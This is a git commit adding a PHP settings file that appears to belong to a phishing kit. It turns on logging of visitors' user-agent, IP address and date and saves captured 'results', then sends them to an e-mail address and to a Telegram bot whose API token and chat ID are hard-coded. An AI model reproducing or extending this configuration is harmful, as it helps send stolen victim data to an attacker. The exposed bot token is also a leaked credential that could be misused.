1769c116e7792dc43b9ce2014aa053c86583747a
rediect <118522109+rediect@users.noreply.github.com>
2022-11-18 12:59:28 +0000

    Add files via upload

---
+++ settings.php
@@ -0,0 +1,18 @@
+<?php
+
+$settings = array(
+	"log_user"		=> "1",	// Log User-Agent, IP and Date
+	"debug"			=> "0",	// Print Errors
+	"send_mail"		=> "1",	// Send E-Mail To Your Mail
+	"save_results"	=> "1",	// Save Results 
+	"telegram"		=> "1",	// Send Results to telegram
+	"chat_id"		=> "1590029327",	// Chat ID Of You
+	"bot_url"		=> "bot5400587566:AAGxh70DPkakgZaxfNXfYT2avIDrvIOdZ54",	// Your Bot API Key (ADD "bot" BEFORE API KEY)
+	"email"			=> "resultdemonx@yandex.com",	// Your E-Mail
+);
+return $settings;
+
+
+
+?>
+
